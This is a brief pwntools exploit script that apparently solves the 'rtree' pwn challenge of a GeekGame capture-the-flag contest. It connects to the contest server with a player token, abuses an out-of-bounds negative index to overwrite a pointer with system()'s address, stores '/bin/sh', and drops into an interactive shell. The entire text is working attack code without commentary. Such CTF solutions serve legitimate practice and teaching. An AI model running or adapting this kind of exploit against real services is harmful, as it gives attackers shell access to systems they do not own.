from pwn import *

r = remote('prob13.geekgame.pku.edu.cn', 10013)
token = b'0:CrazyThursday-VME50'
r.sendline(token)

elf = ELF('./rtree')
system = elf.symbols['system']
binsh = b'/bin/sh\x00'

r.sendline(b'1')
r.recv()
r.sendline(b'1')
r.recv()
r.sendline(b'8')
r.recv()
r.sendline(binsh)
r.recv()

r.sendline(b'1')
r.recv()
r.sendline(b'2')
r.recv()
r.sendline(b'8')
r.recv()
r.sendline(b'0' * 8)
r.recv()

r.sendline(b'3')
r.recv()
r.sendline(b'2')
r.recv()
r.sendline(b'-104')
r.recv()
r.sendline(system.to_bytes(length=8, byteorder='little'))
r.recv()

r.sendline(b'3')
r.recv()
r.sendline(b'1')

r.interactive()